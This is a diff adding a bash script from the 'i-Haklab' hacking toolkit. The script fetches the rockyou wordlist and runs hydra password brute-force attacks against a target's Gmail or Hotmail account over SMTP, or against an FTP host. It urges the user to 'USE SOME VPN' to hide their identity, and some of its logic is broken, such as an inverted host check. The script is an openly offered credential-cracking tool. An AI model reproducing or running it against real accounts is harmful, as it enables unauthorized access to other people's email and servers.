@@ -1,0 +1,54 @@
+#!/bin/bash
+#This file is part of i-Haklab command
+source $PREFIX/share/i-Haklab/.set/var/variables
+source $iHAKLAB/.set/functions/functions
+chk-hydra
+
+if [[ ! -d $iHAKLAB/wordlist ]];then
+	printf "$G(_>)─➤$W Installing dependencies and wordlist...{$Y it could take a while$W}\n"
+	command -v git >/dev/null || yes|apt install git
+	git clone --quiet https://github.com/jeanphorn/wordlist $iHAKLAB/wordlist
+fi
+[[ -d $iHAKLAB/wordlist/rockyou.txt ]] || wget -q https://www.scrapmaker.com/data/wordlists/dictionaries/rockyou.txt -O $iHAKLAB/wordlist/rockyou.txt
+STDERR(){ printf "$R(_>)─➤$W missing argument, type i-Haklab -h for help";exit;}
+
+if [[ $2 = mail ]];then
+	[[ $3 ]] && echo $3 > $PREFIX/tmp/bfmail || STDERR
+	MAIL=$(grep -oE '([hotgmailve]{4,7})' $PREFIX/tmp/bfmail|tail -n 1)
+	printf "$Y(_>)_password_wordlist_{$W default: rockyou.txt $Y}\n ╰─────➤ ";read wordlist
+        [[ -e $wordlist ]] || { printf 2>&1 "$R(_>)─➤$W file doesn't exists. Using default.$W\n";}
+	wordlist=${wordlist:-$iHAKLAB/wordlist/rockyou.txt}
+	rm $PREFIX/tmp/bfmail
+	case $MAIL in
+		hotmail|live)
+			SMTP=smtp.live.com
+			;;
+		gmail)
+			SMTP=smtp.gmail.com
+			;;
+		*)
+			STDERR
+			;;
+	esac
+		printf "\t       $R(_>)─> USE SOME VPN <─(<_)$W\n\t\t  press$G enter$W to start\n"
+		read enter
+		hydra -S -l $3 -P $wordlist -e ns -V -s 465 $SMTP smtp
+
+elif [[ $2 = ftp ]];then
+	for i in ${@};do
+		[[ $i == ?(-)+([:digit:]) ]] && host=$i
+	done
+	[[ ! -z $host ]] && { printf 2>&1 "$R(_>)─➤$W Host not specified... Aborting\n";exit;}
+	printf "$Y(_>)_user_wordlist_{$W default: usernames.txt $Y}\n ╰─────➤ ";read usernames;
+	[[ -e $usernames ]] || { printf 2>&1 "$R(_>)─➤$W file doesn't exists. Using default.$W\n";}
+	userWL=${usernames:-$iHAKLAB/wordlist/usernames.txt}
+	printf "$Y(_>)_password_wordlist_{$W default: rockyou.txt $Y}\n ╰─────➤ ";read wordlist
+	[[ -e $wordlist ]] || { printf 2>&1 "$R(_>)─➤$W file doesn't exists. Using default.$W\n";}
+	wordlist=${wordlist:-$iHAKLAB/wordlist/rockyou.txt}
+	printf "\n\t       $R(_>)─> USE SOME VPN <─(<_)$W\n\t\t  press$G enter$W to start\n"
+	read enter
+        hydra -I -L $userWL -P $wordlist $host ftp://$host
+else
+	STDERR
+
+fi
